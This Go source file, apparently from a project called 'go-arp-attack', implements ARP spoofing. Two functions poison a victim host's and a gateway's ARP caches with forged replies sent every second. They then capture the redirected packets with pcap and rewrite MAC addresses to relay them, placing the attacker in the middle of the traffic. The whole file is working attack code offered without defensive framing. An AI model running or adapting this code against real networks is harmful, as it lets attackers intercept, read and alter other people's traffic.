package spoofing

import (
	"bytes"
	"context"
	"go-arp-attack/send"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func SpoofedGateway(ctx context.Context, iface *net.Interface, gateway, host net.IP) (err error) {
	var gatewayMac net.HardwareAddr
	if gatewayMac, err = send.Request(ctx, iface, gateway); err != nil {
		return err
	}

	var hostMac net.HardwareAddr
	if hostMac, err = send.Request(ctx, iface, host); err != nil {
		return err
	}

	go func() {
		// Create a timer
		for t := time.NewTicker(time.Second); ; {
			select {
			case <-ctx.Done():
				return
			case <-t.C:
				// Tell target. I am gateway
				_ = send.ResponseWithSource(ctx, iface, gateway, iface.HardwareAddr, host, hostMac)
			}
		}
	}()

	var handle *pcap.Handle
	if handle, err = OpenLive(iface); err != nil {
		return
	}
	defer handle.Close()

	for packets := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet).Packets(); ; {
		select {
		case <-ctx.Done():
			return
		case packet := <-packets:
			if packet.Layer(layers.LayerTypeEthernet) == nil {
				continue
			} else if packet.Layer(layers.LayerTypeIPv4) == nil {
				continue
			}

			// Find and check mac
			var eth *layers.Ethernet
			if eth = packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet); !bytes.Equal(eth.DstMAC, iface.HardwareAddr) {
				continue
			}

			// Find and check ip
			var ipv4 *layers.IPv4
			if ipv4 = packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4); !ipv4.DstIP.Equal(host) {
				continue
			}

			eth.SrcMAC = eth.DstMAC // interface mac address, will check mac address is interface mac address. if not. is not allowed
			eth.DstMAC = gatewayMac // gateway mac
			go SerializeAndSendData(handle, &packet)
		}
	}
}

func SpoofedHost(ctx context.Context, iface *net.Interface, gateway, host net.IP) (err error) {
	var gatewayMac net.HardwareAddr
	if gatewayMac, err = send.Request(ctx, iface, gateway); err != nil {
		return err
	}

	var hostMac net.HardwareAddr
	if hostMac, err = send.Request(ctx, iface, host); err != nil {
		return err
	}

	go func() {
		// Create a timer
		for t := time.NewTicker(time.Second); ; {
			select {
			case <-ctx.Done():
				return
			case <-t.C:
				// Tell gateway. I am host
				_ = send.ResponseWithSource(ctx, iface, host, iface.HardwareAddr, gateway, gatewayMac)
			}
		}
	}()

	var handle *pcap.Handle
	if handle, err = OpenLive(iface); err != nil {
		return
	}
	defer handle.Close()

	for packets := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet).Packets(); ; {
		select {
		case <-ctx.Done():
			return
		case packet := <-packets:
			if packet.Layer(layers.LayerTypeEthernet) == nil {
				continue
			} else if packet.Layer(layers.LayerTypeIPv4) == nil {
				continue
			}

			// Find and check mac
			var eth *layers.Ethernet
			if eth = packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet); !bytes.Equal(eth.DstMAC, iface.HardwareAddr) {
				continue
			}

			// Find and check ip
			var ipv4 *layers.IPv4
			if ipv4 = packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4); !ipv4.DstIP.Equal(host) {
				continue
			}

			eth.SrcMAC = eth.DstMAC // interface mac address, will check mac address is interface mac address. if not. is not allowed
			eth.DstMAC = hostMac    // host mac
			go SerializeAndSendData(handle, &packet)
		}
	}
}
